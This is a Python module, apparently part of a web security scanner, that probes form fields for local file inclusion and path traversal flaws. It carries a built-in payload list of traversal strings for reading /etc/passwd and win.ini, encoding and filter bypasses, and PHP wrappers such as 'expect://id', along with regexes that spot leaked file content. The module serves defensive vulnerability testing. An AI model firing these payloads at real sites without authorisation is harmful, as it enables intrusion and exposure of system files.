"""
Local File Inclusion (LFI) / Path Traversal vulnerability scanner.

Detects path traversal and local file inclusion by injecting directory
traversal sequences and checking for file content indicators in responses.
"""

from typing import List, Optional
from pathlib import Path
import re

from scanner.base import BaseScanner
from crawler.crawler import Form
from models.finding import Finding
from utils.http import HTTPClient
from utils.logger import get_logger
from config import (
    PAYLOAD_DIR,
    LFI_PAYLOAD_FILE,
    CWE_MAPPINGS,
    OWASP_MAPPINGS,
)

logger = get_logger(__name__)

# Built-in LFI payloads
LFI_PAYLOADS = [
    # Basic traversal
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    # Null byte bypass (legacy PHP)
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00",
    # Double encoding
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    # Windows paths
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    # URL encoding
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Filter bypass
    "....//....//....//etc/passwd",
    "..../....//....//etc/passwd",
    "/etc/passwd",
    "file:///etc/passwd",
    # Windows specific
    "C:\\Windows\\win.ini",
    "C:/Windows/win.ini",
    "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    # PHP wrappers
    "php://filter/read=convert.base64-encode/resource=index",
    "php://filter/read=convert.base64-encode/resource=../config",
    "php://input",
    "expect://id",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
]

# Indicators of successful LFI
LFI_INDICATORS = [
    # Linux /etc/passwd
    (r"root:.*:0:0:", "Linux /etc/passwd file content"),
    (r"daemon:.*:1:1:", "Linux /etc/passwd file content"),
    (r"bin:.*:2:2:", "Linux /etc/passwd file content"),
    (r"nobody:.*:65534:", "Linux /etc/passwd file content"),
    # Windows win.ini
    (r"\[fonts\]", "Windows win.ini file content"),
    (r"\[extensions\]", "Windows win.ini file content"),
    (r"\[mci extensions\]", "Windows win.ini file content"),
    # Windows hosts file
    (r"127\.0\.0\.1\s+localhost", "System hosts file content"),
    # PHP info
    (r"PHP Version", "PHP configuration exposed"),
    (r"<title>phpinfo\(\)</title>", "PHP info page exposed"),
    # Generic file content
    (r"<\?php", "PHP source code exposed"),
    (r"<\?xml", "XML file content exposed"),
    # Base64 encoded PHP
    (r"PD9waH", "Base64 encoded PHP source code"),
]


class LFIScanner(BaseScanner):
    """
    Local File Inclusion / Path Traversal scanner.

    Tests form fields for path traversal vulnerabilities by injecting
    directory traversal sequences and checking for file content
    indicators in the response.
    """

    def __init__(
        self,
        http_client: HTTPClient,
        payload_file: Optional[Path] = None
    ):
        super().__init__(http_client)
        self.payloads = self._load_payloads(payload_file)
        logger.info(f"LFI Scanner initialized with {len(self.payloads)} payloads")

    @property
    def scanner_name(self) -> str:
        return "LFI"

    def _load_payloads(self, payload_file: Optional[Path]) -> List[str]:
        """Load LFI payloads."""
        if payload_file is None:
            payload_file = PAYLOAD_DIR / LFI_PAYLOAD_FILE

        payloads = self._load_payloads_from_file(payload_file)
        if not payloads:
            payloads = LFI_PAYLOADS

        return payloads

    def _is_path_parameter(self, field_name: str) -> bool:
        """Check if field name suggests it accepts file paths."""
        path_indicators = [
            'file', 'path', 'page', 'include', 'template',
            'doc', 'document', 'folder', 'dir', 'load',
            'read', 'view', 'content', 'module', 'name',
            'lang', 'language', 'locale', 'theme', 'skin',
        ]
        name_lower = field_name.lower()
        return any(indicator in name_lower for indicator in path_indicators)

    def _check_lfi_indicators(self, response_text: str, baseline_text: str) -> Optional[tuple]:
        """
        Check response for LFI indicators, excluding those in the baseline.

        Returns:
            Tuple of (evidence, description) or None
        """
        for pattern, description in LFI_INDICATORS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                # Verify this wasn't already in the baseline response
                if baseline_text and re.search(pattern, baseline_text, re.IGNORECASE):
                    continue

                evidence = response_text[max(0, match.start() - 30):match.end() + 50]
                return evidence.strip()[:200], description

        return None

    def scan_form(self, form: Form) -> List[Finding]:
        """Scan form for LFI / path traversal vulnerabilities."""
        findings = []
        logger.info(f"Scanning form {form.method} {form.action} for LFI")

        # Prioritize path-like parameters
        path_fields = [f for f in form.fields if f.name and self._is_path_parameter(f.name)]
        other_fields = [f for f in self._get_testable_fields(form)
                        if f.name and not self._is_path_parameter(f.name)]

        fields_to_test = [(f, self.payloads) for f in path_fields]
        fields_to_test += [(f, self.payloads[:5]) for f in other_fields]

        for field, payloads in fields_to_test:
            field_vulnerable = False

            # Get baseline response
            baseline_data = self._build_form_data(form, field.name, "normal_value")
            baseline_resp = self._submit_form(form, baseline_data)
            baseline_text = baseline_resp.text if baseline_resp else ""

            for payload in payloads:
                if field_vulnerable:
                    break

                form_data = self._build_form_data(form, field.name, payload)

                try:
                    response = self._submit_form(form, form_data)
                    if not response:
                        continue

                    result = self._check_lfi_indicators(response.text, baseline_text)
                    if result:
                        evidence, description = result

                        # Determine severity
                        severity = 'CRITICAL'
                        if 'passwd' in payload or 'win.ini' in payload:
                            severity = 'CRITICAL'
                        elif 'php://' in payload:
                            severity = 'HIGH'

                        finding = Finding(
                            vuln_type='LFI',
                            url=form.action,
                            parameter=field.name,
                            payload=payload,
                            evidence=evidence,
                            severity=severity,
                            method=form.method,
                            description=f'Local File Inclusion in {field.name}: {description}',
                            remediation='Never use user input directly in file paths. '
                                        'Use an allowlist of permitted files/paths. '
                                        'Implement proper input validation rejecting path separators.',
                            cwe_id=CWE_MAPPINGS.get('LFI', ''),
                            owasp_category=OWASP_MAPPINGS.get('LFI', ''),
                            confidence='HIGH',
                            scanner_module='LFIScanner',
                            tags=['lfi', 'path-traversal'],
                        )
                        findings.append(finding)
                        logger.warning(f"LFI found in {form.action} param '{field.name}'")
                        field_vulnerable = True

                except Exception as e:
                    logger.error(f"Error testing LFI on {form.action}: {e}")

        return findings
